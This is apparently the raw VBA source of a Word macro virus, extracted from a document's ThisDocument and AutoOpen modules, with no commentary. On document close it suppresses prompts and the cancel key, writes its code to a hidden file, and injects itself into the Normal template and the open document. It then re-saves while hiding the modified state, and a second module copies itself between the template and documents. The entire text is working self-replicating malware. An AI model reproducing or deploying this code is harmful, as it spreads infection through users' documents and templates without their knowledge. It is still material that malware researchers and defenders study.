   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
   Rem My Virus Games
       On Error Resume Next
       s = ActiveDocument.Saved
       Application.EnableCancelKey = wdCancelDisabled
       Options.ConfirmConversions = False
       Options.SaveNormalPrompt = False
       Options.SaveNormalPrompt = False
       If Dir("c:\VirusGame", 6) = "" Then
           Open "C:\VirusGame" For Output As #1
           For i = 2 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
               a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
               Print #1, a
               If a = "Rem Virus game end" Then Exit For
           Next
           Close #1
           SetAttr "C:\VirusGame", 6
       End If
       t = ""
       If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) = "Private Sub Document_Close()" Then
           If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "Rem My Virus Games" Then Set t = NormalTemplate.VBProject.VBComponents.Item(1)
       Else
           NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "End Sub"
           NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Private Sub Document_Close()"
           Set t = NormalTemplate.VBProject.VBComponents.Item(1)
       End If
       If t <> "" Then GoTo Infect
       If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) = "Private Sub Document_Close()" Then
           If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "Rem My Virus Games" Then Set t = ActiveDocument.VBProject.VBComponents.Item(1)
       Else
           ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "End Sub"
           ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Private Sub Document_Close()"
           Set t = ActiveDocument.VBProject.VBComponents.Item(1)
       End If

       If t <> "" Then
   Infect:
       Open "C:\VirusGame" For Input As #1
       If LOF(1) = 0 Then GoTo Quit
       i = 2
       Do While Not EOF(1)
           Line Input #1, a
           t.CodeModule.InsertLines i, a
           i = i + 1
       Loop

   Quit:
       Close #1
       If Left(ActiveDocument.Name, 2) <> "ÎÄµµ" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
       End If
       If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
       Kill "c:\VirusGame"
   Rem Virus game end
   End Sub

   Attribute VB_Name = "AutoOpen"
   Sub Main()
   'Hello
     On Error GoTo 0
     If Not ActiveDocHaveCopied Then
       CopyToActiveDoc
     ElseIf Not NormHaveCopied Then
       CopyToNormal
       Else: MsgBox ("Äã³Ô·¹ÁËÂð£¿")
     End If
   End Sub
   Sub CopyToNormal()
     For Each aModule In NormalTemplate.VBProject.VBComponents
       If aModule.Name = "AutoOpen" Then
         IsDblName = True
         Exit For
       End If
     Next aModule
     If IsDblName Then
       With NormalTemplate.VBProject.VBComponents
         .Remove .Item("AutoOpen")
       End With
     End If
     Application.OrganizerCopy Source:=ActiveDocument.FullName, _
          Destination:=NormalTemplate.FullName, _
          Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
     NormalTemplate.Save
   End Sub
   Sub CopyToActiveDoc()
     For Each aModule In ActiveDocument.VBProject.VBComponents
       If aModule.Name = "AutoOpen" Then
         IsDblName = True
         Exit For
       End If
     Next aModule
     If IsDblName Then
       With ActiveDocument.VBProject.VBComponents
         .Remove .Item("AutoOpen")
       End With
     End If
     Application.OrganizerCopy Source:=NormalTemplate.FullName, _
          Destination:=ActiveDocument.FullName, _
          Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
     ActiveDocument.Save
   End Sub
   Function NormHaveCopied() As Boolean
     For Each aModule In NormalTemplate.VBProject.VBComponents
       If aModule.Name = "AutoOpen" Then
         If aModule.CodeModule.Lines(2, 1) = "'Hello" Then NormHaveCopied = True
       End If
     Next aModule
   End Function
   Function ActiveDocHaveCopied() As Boolean
     For Each aModule In ActiveDocument.VBProject.VBComponents
       If aModule.Name = "AutoOpen" Then
         If aModule.CodeModule.Lines(2, 1) = "'Hello" Then ActiveDocHaveCopied = True
       End If
     Next aModule
   End Function
